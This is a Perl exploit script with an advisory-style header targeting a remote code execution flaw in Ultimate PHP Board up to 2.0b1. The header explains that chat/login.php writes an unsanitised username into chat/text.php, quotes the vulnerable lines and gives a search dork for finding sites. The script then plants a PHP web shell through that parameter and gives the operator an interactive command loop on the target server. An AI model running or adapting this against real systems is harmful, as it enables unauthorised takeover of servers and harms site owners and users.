#!/usr/bin/perl
# +-------------------------------------------------------------------------------------------
# + Ultimate PHP Board <= 2.0b1 (chat/login.php) Remote Code Execution Vulnerability
# +-------------------------------------------------------------------------------------------
# + Affected Software .: Ultimate PHP Board (myUPB) <= 2.0b1
# + Vendor ............: http://www.myupb.com/
# + Download ..........: http://fileserv.myupb.com/upb2.0B1.zip
# + Description .......: "Ultimate PHP Board is a free discussion forum that can be used as a free alternative to UBB or vBulletin"
# + Dork ..............: "Powered by UPB"
# + Class .............: Remote Code Execution
# + Risk ..............: High (Remote Code Execution)
# + Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
# +-------------------------------------------------------------------------------------------
# + Details:
# + Ultimate PHP Board chat/login.php does not sanatize the $username ($_GET["username"])
# + variable before writing it to chat/text.php on line 28, arbitrary php code can be written
# + then executed by visiting chat/text.php.
# +
# + Vulnerable Code: 
# + chat/login.php, line(s) 23-28:
# + -> 23: $filename = "text.php";
# + -> 24: $fileAr= file($filename);
# + -> 25: exec("cat /dev/null > '$filename'");
# + -> 26: $fd = fopen( $filename, "a+" );
# + -> 27: $filemessage = "<font size='$font_s' face='$font_face' color='$font_color_main'><b>$username entered at $date</b></font><br>\n";
# + -> 28: fputs($fd,$filemessage);
# +
# + Proof of Concept:
# + http://[target]/[path]/chat/login.php?option=chat&username=[code]
# + http://[target]/[path]/chat/text.php
# +-------------------------------------------------------------------------------------------

use Getopt::Long;
use URI::Escape;
use IO::Socket;

$code = "<?php if (isset(\$_GET[cmd])) passthru(\$_GET[cmd]); die; ?>";

main();

sub usage
{
    print "\nUltimate PHP Board <= 2.0b1 Remote Code Execution Exploit\n";
    print "nuffsaid <nuffsaid[at]newbslove.us>\n";
    print "-h, --host\ttarget host\t(example.com)\n";
    print "-d, --dir\tinstall dir\t(/forum)\n";
    exit;
}

sub main
{
    GetOptions ('h|host=s' => \$host,'d|dir=s' => \$dir);
    usage() unless $host;
    $dir = "/forum" unless $dir;
    $sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"80")
     or die "\nconnect() failed.\n";
    
    print "\nconnected to ".$host.", sending data.\n";
    $sendurl = uri_escape($code);
    print $sock "GET ".$dir."/chat/login.php?option=chat&username=".$sendurl." HTTP/1.1\n";
    print $sock "Host: ".$host."\n";
    print $sock "Accept: */*\n";
    print $sock "Connection: close\n\n";
    print "\n";
    print "attempted to create php shell, server response:\n\n";
    while($recvd = <$sock>)
    {
        print " ".$recvd."";
    }
    
    while($cmd !~ "~quit")
    {
        print "\n\n-> ";
        $cmd = <STDIN>;
        if ($cmd !~ "~quit")
        {
          $sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"80")
           or die "connect() failed.\n";
          $sendurl = uri_escape($cmd);
          print $sock "GET ".$dir."/chat/text.php?cmd=".$sendurl." HTTP/1.1\n";
          print $sock "Host: ".$host."\n";
          print $sock "Accept: */*\n";
          print $sock "Connection: close\n\n";
          print "\n";
          while($recvd = <$sock>)
          {
              print $recvd;
          }
        }
    }
    exit;
}
